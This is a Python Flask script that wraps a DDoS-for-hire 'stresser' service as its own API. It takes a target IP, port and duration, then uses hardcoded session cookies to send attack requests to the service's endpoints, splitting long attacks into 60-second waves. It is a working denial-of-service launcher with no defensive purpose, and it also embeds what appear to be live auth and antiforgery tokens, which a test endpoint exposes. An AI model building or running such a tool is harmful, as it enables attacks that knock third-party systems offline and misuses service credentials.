import requests
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

AUTH_TOKEN = "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
ANTIFORGERY = "CfDJ8Bna8lCn_z1AiiMxA8_ANy0js9s2--epYdS_D4OS73xgQWTmnHzob2h54ETv3HyqJy1-4P4UjxafkPZ6L4g0mRnkRkDZ1cmFfq7xGf03e7xVRJHUB0eRBhXqlUAibNFIJggVrTIay4LCKhfRnqNA5sQ"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://retrostress.net/panel',
    'Origin': 'https://retrostress.net'
})
session.cookies.set('auth_token', AUTH_TOKEN)
session.cookies.set('.AspNetCore.Antiforgery.pFk19hAmY3k', ANTIFORGERY)

def send_attack_real(ip, port, duration):
    """Real attack function with debugging"""
    print(f"[*] Attempting to send attack to {ip}:{port} for {duration}s")
    
    try:
        # Method 1: GET request (simple)
        url1 = f"https://retrostress.net/api/attack"
        params = {'ip': ip, 'port': port, 'time': duration}
        
        print(f"[→] Trying GET: {url1}")
        r1 = session.get(url1, params=params, timeout=10)
        print(f"[←] GET Response: {r1.status_code}")
        
        if r1.status_code == 200:
            print(f"[✓] Attack sent via GET!")
            return True
        
        # Method 2: POST JSON
        url2 = "https://retrostress.net/api/attack"
        payload = {'ip': ip, 'port': port, 'duration': duration, 'method': 'L4'}
        
        print(f"[→] Trying POST JSON: {url2}")
        r2 = session.post(url2, json=payload, timeout=10)
        print(f"[←] POST Response: {r2.status_code}")
        
        if r2.status_code == 200:
            print(f"[✓] Attack sent via POST!")
            return True
            
        # Method 3: Form data
        url3 = "https://retrostress.net/attack/start"
        data = {'ip': ip, 'port': port, 'time': duration}
        
        print(f"[→] Trying FORM: {url3}")
        r3 = session.post(url3, data=data, timeout=10)
        print(f"[←] FORM Response: {r3.status_code}")
        
        if r3.status_code == 200:
            print(f"[✓] Attack sent via FORM!")
            return True
            
        print(f"[✗] All methods failed!")
        return False
        
    except Exception as e:
        print(f"[✗] Exception: {e}")
        return False

@app.route('/api')
@app.route('/api/attack')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_sec = request.args.get('time')
    
    if not ip or not port or not time_sec:
        return jsonify({'error': 'Missing parameters'}), 400
    
    try:
        port = int(port)
        time_sec = int(time_sec)
        
        print(f"\n{'='*60}")
        print(f"[🎯] NEW ATTACK REQUEST")
        print(f"[🎯] Target: {ip}:{port}")
        print(f"[⏱️] Time: {time_sec}s")
        print(f"[🌐] From: {request.remote_addr}")
        print(f"{'='*60}")
        
        # Time splitting
        if time_sec > 60:
            attacks = []
            remaining = time_sec
            while remaining > 0:
                if remaining >= 60:
                    attacks.append(60)
                    remaining -= 60
                else:
                    attacks.append(remaining if remaining >= 30 else 30)
                    break
            
            print(f"[📊] Splitting into: {attacks}")
            
            results = []
            for i, duration in enumerate(attacks, 1):
                print(f"\n[🔥] Attack {i}/{len(attacks)} - {duration}s")
                success = send_attack_real(ip, port, duration)
                results.append({
                    'attack': i,
                    'duration': duration,
                    'success': success
                })
                print(f"[📝] Result: {'SUCCESS' if success else 'FAILED'}")
                
                if success and i < len(attacks):
                    print(f"[⏰] Waiting {duration}s before next attack...")
                    time.sleep(duration)
            
            print(f"\n[✅] All attacks completed!")
            return jsonify({
                'target': f"{ip}:{port}",
                'total_time': time_sec,
                'attacks': attacks,
                'results': results
            })
        else:
            print(f"[🔥] Single attack - {time_sec}s")
            success = send_attack_real(ip, port, time_sec)
            
            if success:
                print(f"[⏰] Waiting {time_sec}s...")
                time.sleep(time_sec)
            
            return jsonify({
                'target': f"{ip}:{port}",
                'duration': time_sec,
                'success': success
            })
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'message': 'RetroStresser API with Full Debug'
    })

@app.route('/test')
def test():
    """Test endpoint to check if API is reachable"""
    return jsonify({
        'status': 'ok',
        'cookies': dict(session.cookies),
        'headers': dict(session.headers)
    })

if __name__ == '__main__':
    print("[+] Starting RetroStresser API...")
    print(f"[+] Auth Token: {AUTH_TOKEN[:30]}...")
    print(f"[+] Antiforgery: {ANTIFORGERY[:30]}...")
    print("[+] Ready for attacks!")
    app.run(host='0.0.0.0', port=8080)
